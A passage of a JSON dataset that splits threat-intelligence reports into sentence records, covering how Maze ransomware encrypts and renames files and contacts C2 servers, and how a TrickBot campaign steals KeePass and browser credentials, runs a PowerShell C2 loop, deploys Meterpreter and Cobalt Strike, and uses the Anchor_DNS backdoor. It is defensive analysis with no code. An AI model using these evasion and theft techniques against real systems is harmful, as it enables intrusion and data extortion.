        "id": "cti_reports_filtered/r-261.md:::S68",
        "text": "- Create a file mapping with the functions \u201cCreateFileMappingW\u201d and \u201cMapViewOfFile\u201d\n",
        "type": "",
        "report": "r-261",
        "line": 68,
        "index": 648
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S69",
        "text": "- Generate a random key of 32 bytes with the function \u201cCryptGenRandom\u201d.\n",
        "type": "",
        "report": "r-261",
        "line": 69,
        "index": 649
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S70",
        "text": "- Generate a random iv of 8 bytes with the function \u201cCryptGenRandom\u201d.\n",
        "type": "",
        "report": "r-261",
        "line": 70,
        "index": 650
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S71",
        "text": "- Reserve 264 bytes of memory with the function \u201cVirtualAlloc\u201d.\n",
        "type": "",
        "report": "r-261",
        "line": 71,
        "index": 651
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S72",
        "text": "- Generate a new random extension for the victim file.",
        "type": "",
        "report": "r-261",
        "line": 72,
        "index": 652
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S73",
        "text": "Each file has a different extension but does not lose the original extension; the new one is appended to the old one.",
        "type": "",
        "report": "r-261",
        "line": 73,
        "index": 653
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S74",
        "text": "For example, \u201c1.zip\u201d becomes \u201c1.zip.gthf\u201d.",
        "type": "",
        "report": "r-261",
        "line": 74,
        "index": 654
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S75",
        "text": "- Crypt the file with the ChaCha algorithm and the key and iv with the RSA public key generated in runtime.\n",
        "type": "",
        "report": "r-261",
        "line": 75,
        "index": 655
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S76",
        "text": "- Write this new block with the key and iv to decrypt at the end of the file.\n",
        "type": "",
        "report": "r-261",
        "line": 76,
        "index": 656
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S77",
        "text": "- Rename the file with the function \u201cMoveFileExW\u201d.",
        "type": "",
        "report": "r-261",
        "line": 77,
        "index": 657
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S78",
        "text": "That way it is not possible to use forensic tools to recover the files because they use the same sector on the raw disk.",
        "type": "",
        "report": "r-261",
        "line": 78,
        "index": 658
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S79",
        "text": "The malware does not delete the file using the function \u201cDeleteFileW\u201d and later create a new one with the crypted data.",
        "type": "",
        "report": "r-261",
        "line": 79,
        "index": 659
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S80",
        "text": "Instead, all changes are applied in the mapping directly, in memory, without using a file pointer on the disk to read and write, which makes the process much quicker.",
        "type": "",
        "report": "r-261",
        "line": 80,
        "index": 660
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S81",
        "text": "- The image of the file is unmapped, and handles closed.\n",
        "type": "",
        "report": "r-261",
        "line": 81,
        "index": 661
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S82",
        "text": "- The process is repeated with new files.\n",
        "type": "",
        "report": "r-261",
        "line": 82,
        "index": 662
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S83",
        "text": "The list of folders that the malware avoids are:\n",
        "type": "",
        "report": "r-261",
        "line": 83,
        "index": 663
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S84",
        "text": "The malware ignores these file extensions:\n",
        "type": "",
        "report": "r-261",
        "line": 84,
        "index": 664
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S85",
        "text": "The malware also has a list of filenames that will not be crypted:\n",
        "type": "",
        "report": "r-261",
        "line": 85,
        "index": 665
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S86",
        "text": "However, it does crypt the file \u201cntuser.ini\u201d to prevent other ransomwares from crypting it.",
        "type": "",
        "report": "r-261",
        "line": 86,
        "index": 666
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S87",
        "text": "It creates the ransom note in each folder that it can.\n",
        "type": "",
        "report": "r-261",
        "line": 87,
        "index": 667
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S88",
        "text": "When the malware finishes crypting all files it changes the desktop wallpaper to this image:\n",
        "type": "",
        "report": "r-261",
        "line": 88,
        "index": 668
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S89",
        "text": "The malware tries to make connections to IP addresses that have been crypted in the binary to send information about the infected machine, as seen below:\n",
        "type": "",
        "report": "r-261",
        "line": 89,
        "index": 669
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S90",
        "text": "It is important to take into consideration that the malware forges the POST string to make the connection with a random choice from a list of possible strings such as \u201cforum\u201d, \u201cphp\u201d, \u201cview\u201d, etc., to make detection harder with IPS or other filters on the network.",
        "type": "",
        "report": "r-261",
        "line": 90,
        "index": 670
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S91",
        "text": "The IP addresses are detected as from the Russian Federation but that does not prove that the malware came from this country; it could be deliberate misdirection but, with the language checks of CIS countries, it certainly appears possible.",
        "type": "",
        "report": "r-261",
        "line": 91,
        "index": 671
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S92",
        "text": "The use of IP addresses instead of domain names is to avoid DNS resolutions that can be altered or redirected to a loopback, for example using the \u201chost\u201d file in Windows.",
        "type": "",
        "report": "r-261",
        "line": 92,
        "index": 672
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S93",
        "text": "This makes the trace of IPs more complicated and avoids having the connection blocked.\n",
        "type": "",
        "report": "r-261",
        "line": 93,
        "index": 673
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S94",
        "text": "The malware uses this agent to make the connection, but it can change between samples:\n",
        "type": "",
        "report": "r-261",
        "line": 94,
        "index": 674
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S95",
        "text": "From a memory dump we can extract the IPs used by these connections, as well as a curious string that talks about Lawrence Abrams, the admin of the web site \u201cbleepingcomputer\u201d who was contacted directly by the developers.",
        "type": "",
        "report": "r-261",
        "line": 95,
        "index": 675
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S96",
        "text": "It is not known why they included this email address because it has no relation to the ransom note and is not used anywhere else.",
        "type": "",
        "report": "r-261",
        "line": 96,
        "index": 676
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S97",
        "text": "Perhaps it is a means of mocking the administrator of a site that frequently reports on ransomware?",
        "type": "",
        "report": "r-261",
        "line": 97,
        "index": 677
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S98",
        "text": "The connections to the C2C IP addresses, in a pcap using Wireshark, can be seen perfectly:\n",
        "type": "",
        "report": "r-261",
        "line": 98,
        "index": 678
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S99",
        "text": "Maze has some strings in memory that are interesting and something that may be worth further analysis in the future:\n",
        "type": "",
        "report": "r-261",
        "line": 99,
        "index": 679
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S100",
        "text": "The webpage for making the payment requested in the ransom note gives a price and verifies that all is correct.\n",
        "type": "",
        "report": "r-261",
        "line": 100,
        "index": 680
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S101",
        "text": "Maze has a chat function to contact the operators and receive information about how to obtain the cryptocurrency required to make payment.",
        "type": "",
        "report": "r-261",
        "line": 101,
        "index": 681
    },
    {
        "id": "cti_reports_filtered/r-261.md:::S102",
        "text": "Of course, as with many types of ransomware, there is an offer to decrypt three images for free and that service has been verified as working:\n",
        "type": "",
        "report": "r-261",
        "line": 102,
        "index": 682
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S0",
        "text": "The attack starts with a phishing email that contains a malicious link to a file hosted on Google Docs named \u201cAnnual Bonus Report.doc\u201d.",
        "type": "",
        "report": "r-280",
        "line": 0,
        "index": 683
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S1",
        "text": "When the user clicks on the link, the TrickBot dropper downloads onto the target machine.",
        "type": "",
        "report": "r-280",
        "line": 1,
        "index": 684
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S2",
        "text": "This differs from previous TrickBot attacks we have seen, where TrickBot is usually dropped through a Microsoft Office document or by another malware like Emotet.",
        "type": "",
        "report": "r-280",
        "line": 2,
        "index": 685
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S3",
        "text": "The campaigns use a TrickBot downloader that is signed and uses an icon to pretend it is a Microsoft Word document.",
        "type": "",
        "report": "r-280",
        "line": 3,
        "index": 686
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S4",
        "text": "When the user double-clicks the file, they are presented with a decoy message box.",
        "type": "",
        "report": "r-280",
        "line": 4,
        "index": 687
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S5",
        "text": "To avoid suspicion, the decoy message suggests the user should update Microsoft Word or open the file from another computer.",
        "type": "",
        "report": "r-280",
        "line": 5,
        "index": 688
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S6",
        "text": "While at first glance these files can be mistaken for legitimate Microsoft Word files, a closer inspection of the file metadata indicates they are not associated with Microsoft Word, nor are they Microsoft Word document files.\n",
        "type": "",
        "report": "r-280",
        "line": 6,
        "index": 689
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S7",
        "text": "Most of the initial payloads in these campaigns are signed with valid certificates to evade security tools.",
        "type": "",
        "report": "r-280",
        "line": 7,
        "index": 690
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S8",
        "text": "They abuse the relative trust that is given to signed binaries to avoid detection.\n",
        "type": "",
        "report": "r-280",
        "line": 8,
        "index": 691
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S9",
        "text": "The message box distracts the user as TrickBot\u2019s payload is downloaded, stored in the %TEMP% folder, and executed.",
        "type": "",
        "report": "r-280",
        "line": 9,
        "index": 692
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S10",
        "text": "A new process injects the TrickBot payload into a svchost.exe process.\n",
        "type": "",
        "report": "r-280",
        "line": 10,
        "index": 693
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S11",
        "text": "Once TrickBot\u2019s main payload is injected into the svchost.exe process, it carries out a series of reconnaissance-related tasks to profile the infected endpoint and the network.",
        "type": "",
        "report": "r-280",
        "line": 11,
        "index": 694
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S12",
        "text": "This information is crucial, as it determines the course of the attack.\n",
        "type": "",
        "report": "r-280",
        "line": 12,
        "index": 695
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S13",
        "text": "TrickBot checks for Internet connectivity by trying to access several designated domains.",
        "type": "",
        "report": "r-280",
        "line": 13,
        "index": 696
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S14",
        "text": "These domains are preconfigured and belong to legitimate web services, including: checkip.amazonaws.com, ipecho.net, ipinfo.io, api.ipify.org, icanhazip.com, myexternalip.com, wtfismyip.com, ip.anysrc.net.\n",
        "type": "",
        "report": "r-280",
        "line": 14,
        "index": 697
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S15",
        "text": "Once TrickBot verifies it can connect to the Internet, it communicates with C2 servers, some of which using TOR-related domains.",
        "type": "",
        "report": "r-280",
        "line": 15,
        "index": 698
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S16",
        "text": "It collects and sends information about where the target machine is located to the C2 servers.",
        "type": "",
        "report": "r-280",
        "line": 16,
        "index": 699
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S17",
        "text": "After TrickBot establishes Internet access and sends information about the location of the target machine, it starts its malicious activity.",
        "type": "",
        "report": "r-280",
        "line": 17,
        "index": 700
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S18",
        "text": "The module core-parser.dll is reflectively loaded into svchost.exe.",
        "type": "",
        "report": "r-280",
        "line": 18,
        "index": 701
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S19",
        "text": "core-parser.dll parses the TrickBot config files and extracts IP addresses for secondary C2 communication, redirection, and web injection logic.",
        "type": "",
        "report": "r-280",
        "line": 19,
        "index": 702
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S20",
        "text": "TrickBot sends the reconnaissance information from the target machine to a hardcoded C2 server.",
        "type": "",
        "report": "r-280",
        "line": 20,
        "index": 703
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S21",
        "text": "The C2 server is responsible for handling the stolen data.\n",
        "type": "",
        "report": "r-280",
        "line": 21,
        "index": 704
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S22",
        "text": "TrickBot also steals data from Internet Explorer by executing the built-in Windows tool ESENTUTL using the living-off-the-land technique (LOLBin).",
        "type": "",
        "report": "r-280",
        "line": 22,
        "index": 705
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S23",
        "text": "This command dumps the Extensible Storage Engine (ESE) database format.\n",
        "type": "",
        "report": "r-280",
        "line": 23,
        "index": 706
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S24",
        "text": "This variant of TrickBot employs a new, unique ability to steal passwords from KeePass, a free, open- source password manager.",
        "type": "",
        "report": "r-280",
        "line": 24,
        "index": 707
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S25",
        "text": "TrickBot's KeePass stealing capabilities seem to be inspired (or even partially copy-pasted) from a publicly available tool dubbed PoshKPBrute, a script that performs a dictionary attack against KeePass .kdbx files.",
        "type": "",
        "report": "r-280",
        "line": 25,
        "index": 708
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S26",
        "text": "Once it finds the dictionary key, it dumps all passwords as an output and sends the attackers the master password.\n",
        "type": "",
        "report": "r-280",
        "line": 26,
        "index": 709
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S27",
        "text": "TrickBot\u2019s stealer module also tries to extract keys from Filezilla, OpenSSH and OpenVPN.\n",
        "type": "",
        "report": "r-280",
        "line": 27,
        "index": 710
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S28",
        "text": "In addition to several crafted PowerShell commands, the attackers use several legitimate Windows processes to gather information, including nltest.exe, net.exe, ipconfig.exe, whoami.exe, and nslookup.exe.",
        "type": "",
        "report": "r-280",
        "line": 28,
        "index": 711
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S29",
        "text": "They gather information on:\n",
        "type": "",
        "report": "r-280",
        "line": 29,
        "index": 712
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S30",
        "text": "- All trusted domains, domains, and domain controllers\n",
        "type": "",
        "report": "r-280",
        "line": 30,
        "index": 713
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S31",
        "text": "- A list of computers and network devices on the network\n",
        "type": "",
        "report": "r-280",
        "line": 31,
        "index": 714
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S32",
        "text": "- The infected machine user and groups the user belongs to\n",
        "type": "",
        "report": "r-280",
        "line": 32,
        "index": 715
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S33",
        "text": "- The infected machine, including machine name, operating system, workstation domain, and more information\n",
        "type": "",
        "report": "r-280",
        "line": 33,
        "index": 716
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S34",
        "text": "- Network adapters that have connected to the machine and DNS servers\n",
        "type": "",
        "report": "r-280",
        "line": 34,
        "index": 717
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S35",
        "text": "The attacker also uses PowerShell to test DNS entry settings.",
        "type": "",
        "report": "r-280",
        "line": 35,
        "index": 718
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S36",
        "text": "They use the command -q=srv_kerberos_tcp on the process nslookup.exe to open an interactive shell.",
        "type": "",
        "report": "r-280",
        "line": 36,
        "index": 719
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S37",
        "text": "They use the shell to expand their search to other machines on the network by searching for things like a list of the domain controllers.",
        "type": "",
        "report": "r-280",
        "line": 37,
        "index": 720
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S38",
        "text": "With this in mind, we gather that the attackers goal is to spread within organizations to multiple machines, not just to the target machine.\n",
        "type": "",
        "report": "r-280",
        "line": 38,
        "index": 721
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S39",
        "text": "The threat actor evaluates information sent back to the C2 server and identifies if they have successfully infected a high-value target.",
        "type": "",
        "report": "r-280",
        "line": 39,
        "index": 722
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S40",
        "text": "If so, they escalate their efforts by switching to interactive hacking: reconnaissance, credential dumping, lateral movement, and in some cases the mass deployment of ransomware across endpoints connected to the domain controller.\n",
        "type": "",
        "report": "r-280",
        "line": 40,
        "index": 723
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S41",
        "text": "The threat actor leverages PowerShell to send additional payloads to the target machine.",
        "type": "",
        "report": "r-280",
        "line": 41,
        "index": 724
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S42",
        "text": "They issue commands to fetch a payload from a secondary server and, once it\u2019s downloaded, immediately execute it on the target machine through PowerShell.\n",
        "type": "",
        "report": "r-280",
        "line": 42,
        "index": 725
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S43",
        "text": "The northracing[.]net URL contains a PowerShell script in the contents of the webpage.",
        "type": "",
        "report": "r-280",
        "line": 43,
        "index": 726
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S44",
        "text": "Though we were unable to fetch the script used in this specific incident, we were able to pivot off the query parameters used in the above PowerShell script (?a=irs&x=) to find a sandbox report for similar activity.",
        "type": "",
        "report": "r-280",
        "line": 44,
        "index": 727
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S45",
        "text": "The PowerShell payload runs two stages: the first stage sends basic information to the C2 domain and waits for a response to see if it should continue its operation.",
        "type": "",
        "report": "r-280",
        "line": 45,
        "index": 728
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S46",
        "text": "If the threat actor does not send a stop flag, the PowerShell script runs in a constant loop and continuously POSTs data to the same domain the payload was fetched from.",
        "type": "",
        "report": "r-280",
        "line": 46,
        "index": 729
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S47",
        "text": "Each POST request is sent along with a UUID generated from the user\u2019s hostname and the current process ID.\n",
        "type": "",
        "report": "r-280",
        "line": 47,
        "index": 730
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S48",
        "text": "A POST request containing basic information about the machine is sent, which includes the current user and their domain, the root of the file system, and information about the operating system.\n",
        "type": "",
        "report": "r-280",
        "line": 48,
        "index": 731
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S49",
        "text": "This information is sent to the C2 along with the `i` parameter.",
        "type": "",
        "report": "r-280",
        "line": 49,
        "index": 732
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S50",
        "text": "When a response is received, the payload checks to see if the response matches the value cex01.",
        "type": "",
        "report": "r-280",
        "line": 50,
        "index": 733
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S51",
        "text": "If it does, the PowerShell script stops executing and kills the task.",
        "type": "",
        "report": "r-280",
        "line": 51,
        "index": 734
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S52",
        "text": "If the response is any other value, the script sets a timeout variable based on the response and continues to the main loop.\n",
        "type": "",
        "report": "r-280",
        "line": 52,
        "index": 735
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S53",
        "text": "This indicates that the attacker is either looking to target specific Windows domains or specific operating system versions.",
        "type": "",
        "report": "r-280",
        "line": 53,
        "index": 736
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S54",
        "text": "The main loop sends a POST request to the server with the `t` parameter, which requests the next commands from the server.\n",
        "type": "",
        "report": "r-280",
        "line": 54,
        "index": 737
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S55",
        "text": "Each line in the response from the threat actor contains a Base64-encoded command, which is decoded and then immediately executed using PowerShell through the Invoke-Expression (IEX) commandlet.",
        "type": "",
        "report": "r-280",
        "line": 55,
        "index": 738
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S56",
        "text": "The output of the command is sent back to the C2 server using a POST request with the \u201ca\u201d parameter.",
        "type": "",
        "report": "r-280",
        "line": 56,
        "index": 739
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S57",
        "text": "Meterpreter & Cobalt Strike Implants\n",
        "type": "",
        "report": "r-280",
        "line": 57,
        "index": 740
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S58",
        "text": "The attackers use a Meterpreter implant to carry out post-exploitation actions.",
        "type": "",
        "report": "r-280",
        "line": 58,
        "index": 741
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S59",
        "text": "The Cybereason Platform detects both the shellcode and various Meterpreter DLLs reflectively loaded to memory.",
        "type": "",
        "report": "r-280",
        "line": 59,
        "index": 742
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S60",
        "text": "The detected DLLs include:\n",
        "type": "",
        "report": "r-280",
        "line": 60,
        "index": 743
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S61",
        "text": "- Metsrv.dll: For Meterpreter, where the protocol and extension systems are implemented\n",
        "type": "",
        "report": "r-280",
        "line": 61,
        "index": 744
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S62",
        "text": "- Ext_server_priv.x86.dll: For privilege escalation\n",
        "type": "",
        "report": "r-280",
        "line": 62,
        "index": 745
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S63",
        "text": "- Ext_server_stdapi.x86.dll: A metasploit post exploitation module used for reconnaissance\n",
        "type": "",
        "report": "r-280",
        "line": 63,
        "index": 746
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S64",
        "text": "Cybereason detects the reflectively loaded malicious modules as a Meterpreter agent and shellcode executed by the Meterpreter agent.",
        "type": "",
        "report": "r-280",
        "line": 64,
        "index": 747
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S65",
        "text": "The Meterpreter agent creates a connection to port 4444 on the external IP address 91.12.89[.]129.\n",
        "type": "",
        "report": "r-280",
        "line": 65,
        "index": 748
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S66",
        "text": "Using Meterpreter, the attackers injected Cobalt Strike and other Metasploit payloads into the rundll32.exe process.",
        "type": "",
        "report": "r-280",
        "line": 66,
        "index": 749
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S67",
        "text": "The attacker uses the following metasploit modules:\n",
        "type": "",
        "report": "r-280",
        "line": 67,
        "index": 750
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S68",
        "text": "- ext_server_extapi.x86.dll : Obtains clipboard data and manipulates and decrypts the NTDS file \n",
        "type": "",
        "report": "r-280",
        "line": 68,
        "index": 751
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S69",
        "text": "- ext_server_priv.x86.dll : Performs privilege escalation\n",
        "type": "",
        "report": "r-280",
        "line": 69,
        "index": 752
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S70",
        "text": "- Ext_server_stdapi.x86.dll : Performs reconnaissance activity\n",
        "type": "",
        "report": "r-280",
        "line": 70,
        "index": 753
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S71",
        "text": "- Bypassuac.x64.dll: A post-exploitation module used to bypass User Account Control\n",
        "type": "",
        "report": "r-280",
        "line": 71,
        "index": 754
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S72",
        "text": "Both Meterpreter and Cobalt Strike are legitimate penetration testing tools that have been repeatedly used by various threat actors, including the FIN6 threat actor.",
        "type": "",
        "report": "r-280",
        "line": 72,
        "index": 755
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S73",
        "text": "The threat actor uses known Cobalt Strike modules to enumerate Active Directory information:\n",
        "type": "",
        "report": "r-280",
        "line": 73,
        "index": 756
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S74",
        "text": "The attackers execute several Base64-encoded PowerShell commands in order to determine if the infected machine\u2019s user is in the admin or domain admin group.",
        "type": "",
        "report": "r-280",
        "line": 74,
        "index": 757
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S75",
        "text": "After verifying the user is an admin, the threat actor gathers information about the domain controllers and their IP addresses using an additional Base64-encoded and compressed PowerShell command.",
        "type": "",
        "report": "r-280",
        "line": 75,
        "index": 758
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S76",
        "text": "The decoded PowerShell command that attempts to gather domain controller information.",
        "type": "",
        "report": "r-280",
        "line": 76,
        "index": 759
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S77",
        "text": "The attackers deploys a batch script that executes the ADfind.exe tool to enumerate users, groups, and computers of the Windows domain.",
        "type": "",
        "report": "r-280",
        "line": 77,
        "index": 760
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S78",
        "text": "The ADfind tool has reportedly been used previously in attacks related to FIN6.\n",
        "type": "",
        "report": "r-280",
        "line": 78,
        "index": 761
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S79",
        "text": "One of the most interesting payloads in these attacks is the Anchor_DNS malware, which was originally discovered in October 2019 by NTT Security.",
        "type": "",
        "report": "r-280",
        "line": 79,
        "index": 762
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S80",
        "text": "It is classified by NTT as a variant of the infamous TrickBot malware, which uses DNS tunneling to stealthily communicate with C2 servers.",
        "type": "",
        "report": "r-280",
        "line": 80,
        "index": 763
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S81",
        "text": "Though this variant was first discovered in October 2019, there is evidence that Anchor_DNS was used as far back as March 2019.\\\n",
        "type": "",
        "report": "r-280",
        "line": 81,
        "index": 764
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S82",
        "text": "This new variant acts as a sophisticated, stealthy backdoor that selectively chooses high-profile targets.",
        "type": "",
        "report": "r-280",
        "line": 82,
        "index": 765
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S83",
        "text": "Anchor_DNS is still undergoing rapid development cycles with code changes and new feature updates every few weeks.\n",
        "type": "",
        "report": "r-280",
        "line": 83,
        "index": 766
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S84",
        "text": "This is a new variant of Anchor_DNS that appeared as early as November 2019 and exhibits the following changes in code and behavior:\n",
        "type": "",
        "report": "r-280",
        "line": 84,
        "index": 767
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S85",
        "text": "- No self-deletion mechanism shown in previous samples\n",
        "type": "",
        "report": "r-280",
        "line": 85,
        "index": 768
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S86",
        "text": "- No internet connectivity checks using legitimate online web services\n",
        "type": "",
        "report": "r-280",
        "line": 86,
        "index": 769
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S87",
        "text": "- A built-in capability to check for C2 availability using ICMP (ping)\n",
        "type": "",
        "report": "r-280",
        "line": 87,
        "index": 770
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S88",
        "text": "- Additional partial string encryption and code obfuscation\n",
        "type": "",
        "report": "r-280",
        "line": 88,
        "index": 771
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S89",
        "text": "anchorDNS_x64.exe contains a PDB path with the name of the malware, Anchor_DNS.",
        "type": "",
        "report": "r-280",
        "line": 89,
        "index": 772
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S90",
        "text": "This file is the 64-bit version of Anchor_DNS, however, there were earlier instances of the 32-bit version as well.",
        "type": "",
        "report": "r-280",
        "line": 90,
        "index": 773
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S91",
        "text": "The project name shows that this is the fifth version of Anchor_DNS.\n",
        "type": "",
        "report": "r-280",
        "line": 91,
        "index": 774
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S92",
        "text": "Many strings in the code have typos and grammatical mistakes, further affirming our suspicion that the authors of Anchor_DNS are not native english speakers.\n",
        "type": "",
        "report": "r-280",
        "line": 92,
        "index": 775
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S93",
        "text": "The threat actor gave considerable effort to obfuscating the code of this new Anchor_DNS variant using stack strings, string encryption, and by implementing a packer.",
        "type": "",
        "report": "r-280",
        "line": 93,
        "index": 776
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S94",
        "text": "The following example shows considerable changes in the code of the WinMain() function between an older variant of Anchor_DNS and the new variant.",
        "type": "",
        "report": "r-280",
        "line": 94,
        "index": 777
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S95",
        "text": "- -i flag: \n",
        "type": "",
        "report": "r-280",
        "line": 95,
        "index": 778
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S96",
        "text": "  - creates a scheduled task with the following naming convention (e.g \u201cNotepad++ autoupdate#94654\u201d): [random folder name in %APPDATA%] autoupdate#[random_number]\n",
        "type": "",
        "report": "r-280",
        "line": 96,
        "index": 779
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S97",
        "text": "  - Writes NTFS ADS files ($TASK, $GUID, $FILE)\n",
        "type": "",
        "report": "r-280",
        "line": 97,
        "index": 780
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S98",
        "text": "- -u flag: \n",
        "type": "",
        "report": "r-280",
        "line": 98,
        "index": 781
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S99",
        "text": "  - New Variant : executes the malware\u2019s main communication module with the C2 \n",
        "type": "",
        "report": "r-280",
        "line": 99,
        "index": 782
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S100",
        "text": "  - Old Variant: Drops a copy in %TEMP% Creates ADS files ($GUID, $FILE)\n",
        "type": "",
        "report": "r-280",
        "line": 100,
        "index": 783
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S101",
        "text": "- -s flag: appears only on older versions of Anchor_DNS and runs the program without creating persistence and self-deletes once done.",
        "type": "",
        "report": "r-280",
        "line": 101,
        "index": 784
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S102",
        "text": "appears only on older versions of Anchor_DNS and runs the program without creating persistence and self-deletes once done.",
        "type": "",
        "report": "r-280",
        "line": 102,
        "index": 785
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S103",
        "text": "- --log=: expects a file name to write log file in C:\\Users\\[USER]\n",
        "type": "",
        "report": "r-280",
        "line": 103,
        "index": 786
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S104",
